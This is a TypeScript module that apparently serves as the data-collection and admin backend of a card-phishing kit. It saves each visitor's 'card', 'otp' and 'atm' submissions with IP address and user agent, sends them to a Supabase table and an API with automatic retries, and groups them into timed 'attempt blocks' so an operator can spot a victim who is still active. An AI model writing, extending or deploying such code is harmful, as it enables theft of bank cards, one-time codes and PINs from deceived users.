export interface SubmissionRow {
  id: number;
  sessionId: string;
  type: "card" | "otp" | "atm" | "initial" | "payment";
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
}

export interface AttemptBlock {
  attemptNumber: number;
  startTime: string;
  card?: SubmissionRow;
  otp?: SubmissionRow;
  atm?: SubmissionRow;
  isActive: boolean;
}

// Environment variables
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL ?? "";
const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY ?? "";

interface PendingSubmission {
  id: string;
  type: string;
  sessionId: string;
  data: Record<string, any>;
  attempts: number;
  lastAttempt?: number;
}

const KEY = "admin_submissions";
const PENDING_KEY = "pending_submissions";
const MAX_RETRY_ATTEMPTS = 5;
const RETRY_DELAY = 5000; // 5 seconds
const ATTEMPT_GAP_MS = 10 * 60 * 1000; // 10 minutes gap to split attempts

let retryIntervalId: number | null = null;

export function ensureSessionId(): string {
  let s = localStorage.getItem("sessionId");
  if (!s) {
    s = crypto.randomUUID();
    localStorage.setItem("sessionId", s);
  }
  return s;
}

import { submitSubmission } from "@/lib/api";

// Group submissions into attempt blocks based on time gaps
export function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
  if (rows.length === 0) return [];

  // Sort by createdAt ascending (oldest first)
  const sorted = [...rows].sort((a, b) => 
    new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
  );

  const blocks: AttemptBlock[] = [];
  let currentBlock: AttemptBlock | null = null;
  let attemptNumber = 1;

  for (const row of sorted) {
    if (!currentBlock) {
      currentBlock = {
        attemptNumber: attemptNumber++,
        startTime: row.createdAt,
        isActive: false,
      };
    }

    // Check if we need to start a new block (time gap > 10 minutes)
    const timeDiff = new Date(row.createdAt).getTime() - new Date(currentBlock.startTime).getTime();
    
    if (timeDiff > ATTEMPT_GAP_MS && (row.type === "card")) {
      // Save current block and start new one
      blocks.push(currentBlock);
      currentBlock = {
        attemptNumber: attemptNumber++,
        startTime: row.createdAt,
        isActive: false,
      };
    }

    // Add row to current block
    switch (row.type) {
      case "card":
        currentBlock.card = row;
        break;
      case "otp":
        currentBlock.otp = row;
        break;
      case "atm":
        currentBlock.atm = row;
        break;
    }
  }

  // Don't forget the last block
  if (currentBlock) {
    blocks.push(currentBlock);
  }

  // Mark the most recent block as active (if within 5 minutes)
  if (blocks.length > 0) {
    const latestBlock = blocks[blocks.length - 1];
    const latestTime = new Date(latestBlock.startTime).getTime();
    const now = Date.now();
    if (now - latestTime < 5 * 60 * 1000) { // 5 minutes
      latestBlock.isActive = true;
    }
  }

  return blocks;
}

export function getSubmissions(): SubmissionRow[] {
  const raw = localStorage.getItem(KEY);
  if (!raw) return [];
  try { return JSON.parse(raw) as SubmissionRow[]; }
  catch { return []; }
}

function getPendingSubmissions(): PendingSubmission[] {
  const raw = localStorage.getItem(PENDING_KEY);
  if (!raw) return [];
  try { return JSON.parse(raw) as PendingSubmission[]; }
  catch { return []; }
}

function savePendingSubmissions(pending: PendingSubmission[]): void {
  localStorage.setItem(PENDING_KEY, JSON.stringify(pending));
}

function addToPending(type: string, sessionId: string, data: Record<string, any>): void {
  const pending = getPendingSubmissions();
  pending.push({
    id: `${sessionId}_${type}_${Date.now()}`,
    type,
    sessionId,
    data,
    attempts: 0,
  });
  savePendingSubmissions(pending);
}

async function retryPendingSubmissions(): Promise<void> {
  const pending = getPendingSubmissions();
  if (pending.length === 0) return;

  const now = Date.now();
  const remaining: PendingSubmission[] = [];

  for (const submission of pending) {
    const lastAttempt = submission.lastAttempt ?? 0;
    const timeSinceLastAttempt = now - lastAttempt;

    // Skip if not enough time has passed
    if (timeSinceLastAttempt < RETRY_DELAY && submission.attempts > 0) {
      remaining.push(submission);
      continue;
    }

    // Skip if max attempts reached
    if (submission.attempts >= MAX_RETRY_ATTEMPTS) {
      console.warn(`Giving up on submission ${submission.id} after ${MAX_RETRY_ATTEMPTS} attempts`);
      continue;
    }

    try {
      await submitSubmission(submission.type, {
        sessionId: submission.sessionId,
        ...submission.data,
      });
      console.log(`Successfully submitted ${submission.id}`);
    } catch (error) {
      submission.attempts += 1;
      submission.lastAttempt = now;
      remaining.push(submission);
      console.warn(`Attempt ${submission.attempts} failed for ${submission.id}:`, error);
    }
  }

  savePendingSubmissions(remaining);
}

function startRetryLoop(): void {
  if (retryIntervalId !== null) return;
  retryIntervalId = window.setInterval(() => {
    void retryPendingSubmissions();
  }, RETRY_DELAY) as unknown as number;
}

// Save to Supabase - Each action is a NEW row, never update existing
async function saveToSupabase(type: string, sessionId: string, data: Record<string, any>): Promise<void> {
  console.log("💾 saveToSupabase called:", { type, sessionId });

  if (!supabaseUrl || !supabaseKey) {
    console.log("❌ Supabase not configured in submissions.ts, skipping cloud save");
    return;
  }

  try {
    // Each submission is a NEW row - never update or merge
    const submissionData = {
      ...data,
      client_timestamp: new Date().toISOString(),
    };

    const response = await fetch(`${supabaseUrl}/rest/v1/submissions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
        'Prefer': 'return=representation'
      },
      body: JSON.stringify({
        session_id: sessionId,
        type: type,
        data: submissionData,
        ip_address: data.ipAddress || null,
        user_agent: data.userAgent || null,
        created_at: new Date().toISOString(),
      }),
    });

    console.log("📬 saveToSupabase response status:", response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Failed to save to Supabase:", response.status, errorText);
      throw new Error(`HTTP ${response.status}: ${errorText}`);
    }

    const result = await response.json();
    console.log("✅ Saved to Supabase:", type, "for session", sessionId, result);
  } catch (error) {
    console.error("❌ Supabase save error:", error);
    throw error;
  }
}

// Get submissions from Supabase
export async function getSubmissionsFromSupabase(sessionId?: string): Promise<SubmissionRow[]> {
  if (!supabaseUrl || !supabaseKey) {
    return getSubmissions();
  }

  try {
    let url = `${supabaseUrl}/rest/v1/submissions?select=*&order=created_at.desc`;
    if (sessionId) {
      url += `&session_id=eq.${sessionId}`;
    }

    const response = await fetch(url, {
      headers: {
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
      },
    });

    if (!response.ok) {
      console.error("Failed to fetch from Supabase:", response.status);
      return [];
    }

    const data = await response.json();

    return (data || []).map((row: any) => ({
      id: row.id,
      sessionId: row.session_id,
      type: row.type,
      data: row.data ? (typeof row.data === 'string' ? row.data : JSON.stringify(row.data)) : null,
      ipAddress: row.ip_address,
      createdAt: row.created_at,
    }));
  } catch (error) {
    console.error("Supabase fetch error:", error);
    return [];
  }
}

export async function addSubmission(type: string, sessionId: string, data: Record<string, any>): Promise<SubmissionRow> {
  // Each action is a SEPARATE row - never merge or update
  const subs = getSubmissions();
  const nextId = Date.now();
  const clientTimestamp = new Date().toISOString();

  const row: SubmissionRow = {
    id: nextId,
    sessionId,
    type: type as SubmissionRow["type"],
    data: JSON.stringify({
      ...data,
      client_timestamp: clientTimestamp,
    }),
    ipAddress: data.ipAddress || null,
    createdAt: clientTimestamp,
  };

  // Always ADD new row - never remove or update old rows
  subs.push(row);
  localStorage.setItem(KEY, JSON.stringify(subs));

  console.log("📝 addSubmission called:", { type, sessionId, clientTimestamp });

  // Send submission to server with retry mechanism
  // AND save to Supabase for permanent storage
  const saveToSupabasePromises: Promise<void>[] = [];

  if (supabaseUrl && supabaseKey) {
    console.log("💾 Will save to Supabase...");
    saveToSupabasePromises.push(saveToSupabase(type, sessionId, {
      ...data,
      client_timestamp: clientTimestamp,
    }).catch(e => {
      console.warn("⚠️ Supabase save failed:", e);
    }));
  } else {
    console.log("❌ Supabase not configured, skipping cloud save");
  }

  try {
    await Promise.all([
      submitSubmission(type, { sessionId, ...data }),
      ...saveToSupabasePromises
    ]);
    console.log(`✅ Successfully submitted ${type} for session ${sessionId}`);
  } catch (error) {
    console.warn(`⚠️ Failed to submit ${type}, adding to retry queue:`, error);
    addToPending(type, sessionId, {
      ...data,
      client_timestamp: clientTimestamp,
    });
    startRetryLoop();
  }

  return row;
}

export function clearSubmissions() {
  localStorage.removeItem(KEY);
  localStorage.removeItem(PENDING_KEY);
  if (retryIntervalId !== null) {
    window.clearInterval(retryIntervalId);
    retryIntervalId = null;
  }
}

// Initialize retry loop on page load
if (typeof window !== "undefined") {
  const pending = getPendingSubmissions();
  if (pending.length > 0) {
    startRetryLoop();
  }
}
